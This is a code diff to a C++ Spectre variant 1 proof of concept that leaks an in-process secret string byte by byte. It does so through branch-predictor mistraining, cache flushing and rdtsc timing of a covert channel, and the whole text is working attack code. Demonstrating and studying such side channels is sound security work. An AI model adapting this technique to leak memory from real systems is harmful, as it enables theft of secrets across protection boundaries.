@@ -1,7 +1,9 @@
 // Compile: g++ -O{1, 2} main.cpp -o main
 // Run: ./main 160 2
 #include <stdio.h>
+#include <string.h>
 #include <x86intrin.h>
+#include <unistd.h>
 
 using u8 = unsigned char;
 using u32 = unsigned int;
@@ -29,10 +31,10 @@ volatile u8 sink = 0;
 
 alignas(PAGE_SZ) struct Data {
     u8 values[4] = {1, 2, 3, 4};            // 'get_value' doesn't guard this.
-    char secret[4] = {'B', 'E', 'N', 'T'};  // 'get_value' does guard this.
+    char secret[21] = "HORRIBLYYBROKENNCODE";  // 'get_value' does guard this.
 } S;
 
-u8 get_value(int idx, u8* covert) {
+[[gnu::noinline]] u8 get_value(int idx, u8* covert) {
     if (idx < LIMIT) {
         // Every PAGE_SZ * S.values[idx] maps to a unique page in 'covert'.
         // Stream prefetchers don't cross page boundaries, so we are guaranteed
@@ -41,18 +43,14 @@ u8 get_value(int idx, u8* covert) {
         // to (base + 368'640) where 'base' is the base address of 'covert'. This is
         // fine because 'covert' spans over 256 distinct pages: from (base + 0) to
         // (base + 1'048'576).
-        u8 v1 = covert[PAGE_SZ * (S.values[idx])];
-        u8 v2 = covert[PAGE_SZ * (S.values[idx + 1])];
-        u8 v3 = covert[PAGE_SZ * (S.values[idx + 2])];
-        u8 v4 = covert[PAGE_SZ * (S.values[idx + 3])];
-        return (v1 << v2) ^ (v3 << v4);
+        return covert[PAGE_SZ * (S.values[idx])];
     }
     return 0;
 }
 
 // LFENCE pins rdtsc before/after the load so the measured interval actually
 // covers the load. Without the fence, nothing stops rdtsc from reordering
-// with the load without fences. We don't want that.
+// with the load. We don't want that.
 inline u32 probe_latency(u8* addr) {
     u64 t0 = __rdtsc();
     _mm_lfence();
@@ -62,22 +60,12 @@ inline u32 probe_latency(u8* addr) {
     return (u32)(t1 - t0);
 }
 
-int main(int argc, char** argv) {
-    u32 threshold = argc > 1 ? atoi(argv[1]) : 120;
-    u32 hit_threshold = argc > 2 ? atoi(argv[2]) : 1;
-    volatile int sum = 0;
-
-    // Warm up.
-    for (int i = 0; i < 256; i++) {
-        covert[i * PAGE_SZ] = 1;
-    }
-
+char recover_byte(int byte_idx, u8* covert, int threshold, int hit_threshold, int& sum) {
     int hits[26] = {0};
-
     int rounds = 1000;
     for (int r = 0; r < rounds; r++) {
         // Train the predictor toward "taken".
-        for (int t = 0; t < 32; t++) {
+        for (int t = 0; t < 1024; t++) {
             sum += get_value(0, covert);
         }
 
@@ -87,11 +75,11 @@ int main(int argc, char** argv) {
             _mm_clflush(&covert[PAGE_SZ * (u8)secret_space[i]]);
         }
 
-        // Malign access: idx=4 is out of bounds. The misprediction speculatively
+        // Malign access. byte_idx > 4 is out of bounds. The misprediction speculatively
         // reads S.secret through the covert channel. MFENCE prevents all loads
         // and stores from overlapping with the probing load.
         _mm_mfence();
-        sum += get_value(4, covert);
+        sum += get_value(byte_idx, covert);
         _mm_mfence();
 
         for (int n = 0; n < 26; n++) {
@@ -102,14 +90,33 @@ int main(int argc, char** argv) {
     }
 
     // A real leaked byte hits on the large majority of rounds.
-    int k = 0;
     for (int i = 0; i < 26; i++) {
         if (hits[i] >= hit_threshold) {
-            store[k++] = secret_space[i];
+            return secret_space[i];
         }
     }
-    store[k] = 0;
+    printf("Couldn't recover byte at index=%i!\n", byte_idx);
+    printf("You may try tweaking `threshold` and `hit_threshold` and see if that helps.\n");
+    exit(1);
+}
 
-    printf("Recovered bytes: %s\n", store);
-    return sum;
+int main(int argc, char** argv) {
+    u32 threshold = argc > 1 ? atoi(argv[1]) : 160;
+    u32 hit_threshold = argc > 2 ? atoi(argv[2]) : 1;
+    int secret_length = strlen(S.secret);
+
+    // Prefault covert pages.
+    for (int i = 0; i < 256; i++) {
+        covert[i * PAGE_SZ] = 1;
+    }
+
+    // Dummy value to prevent the compiler from eliding `get_value` calls.
+    int sum = 0;
+    char recovered_secret[secret_length + 1] = {0};
+    for (int idx = 4, k = 0; k < secret_length; idx++, k++) {
+        recovered_secret[k] = recover_byte(idx, covert, threshold, hit_threshold, sum);
+    }
+
+    printf("Recovered secret: %s\n", recovered_secret);
+    return 0;
 }
